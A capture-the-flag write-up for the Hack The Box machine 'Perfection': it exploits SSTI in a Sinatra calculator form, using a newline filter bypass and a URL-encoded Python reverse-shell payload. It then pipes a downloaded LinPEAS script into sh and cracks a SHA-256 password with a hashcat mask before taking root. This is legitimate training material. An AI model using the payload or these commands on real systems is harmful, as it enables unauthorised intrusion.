# Perfection

A writeup for the machine [Perfection](https://app.hackthebox.com/machines/Perfection) on Hack The Box.

<Image src={require("./banner.png").default} width="700" />

## Footprinting

### Nmap scans

Firstly, we can start with a nmap scan.

We find two open ports with one web servers publicly accessible.

```bash
nmap -sS <HOST>
```

```
22 -> SSH
80 -> HTTP
```

<Image src={require("./nmap.png").default} />

### Web server

The web server is running a simple website with an home page and a weight calculator form.

<Image src={require("./homepage.png").default} />

<Image src={require("./calculator.png").default} />

We can try to fuzz the website to find hidden directories.

```bash
gobuster dir -u http://<HOST> -w /usr/share/wordlists/dirb/common.txt
```

No hidden directories are found.

If we open a 404 page, we can see that the server is running `Sinatra`, a Ruby web framework.

<Image src={require("./sinatra.png").default} />

## User flag

### Weight calculator

The only interesting thing we can find is the weight calculator form.

We can try to test it with Burp Repeater to see if it's vulnerable.

It is required to insert an overall weight of 100 otherwise a block message is shown.

If correct weights are inserted, with categories and grades as alphanumeric characters, the application shows a message with the data inserted.

<Image src={require("./burp-repeater.png").default} />

### SSTI

This last test is interesting because it seems that the application is vulnerable to Server-Side Template Injection (SSTI).

Special characters are not allowed but still the form seems vulnerable to SSTI.

By looking online, we can find that %0A is a newline character and can be used to bypass the filter.

After that, we have to urlencode the payload and insert it in the form.

<Image src={require("./burp-ssti.png").default} />

### Reverse shell

To get a reverse shell, we can use the following payload.

```
category1=A%0A
%3C%25=%20system(%22whoami%22)%20%25%3E
%3C%25=%20%60python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.155%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'%60%20%25%3E
&grade1=11&weight1=20&category2=2&grade2=11&weight2=20&category3=3&grade3=11&weight3=20&category4=4&grade4=11&weight4=20&category5=5&grade5=11&weight5=20
```

<Image src={require("./cyberchef.png").default} />

<Image src={require("./rev-shell.png").default} />

## Root flag

### Users database

Inside the home directory of Susan there is the source code of the web application and a folder called migration.

In the latter, we can find a Sqlite database file.

<Image src={require("./database.png").default} />

The database contains only a table with some users and their hashed passwords.

```bash
strings pupilpath_credentials.db
```

<Image src={require("./password.png").default} />


### First cracking attempt

The hashing algorithm used for the password seems SHA-256.

However, cracking the password with common wordlists does not give any result.

```bash
hashcat -m 1430 -a 0 -oabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f /usr/share/wordlists/rockyou.txt
```

### Scan with LinPEAS

We can try to scan with LinPEAS to find interesting files and configurations.

```bash
# In the host
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
python3 -m http.server
```

```bash
# In the target
curl IP:PORT/linpeas.sh | sh
```

<Image src={require("./linpeas.png").default} />

There is a mail file for Susan accessible both by the user and the root.

```bash
cat /var/mail/susan
```

<Image src={require("./mail.png").default} />

### Cracking the password

Inside we find the correct password format.

```
{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

susan_nasus_ddddddddd
```

It is possible to use Hashcat with a specific mask to crack the password.

```sh
hashcat -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d -m 1400
```

<Image src={require("./hashcat.png").default} /> 

We can now login through SSH as Susan and retrieve the root flag by switching to the root user.

```bash
ssh susan@MACHINE_IP
# ...
sudo su
```
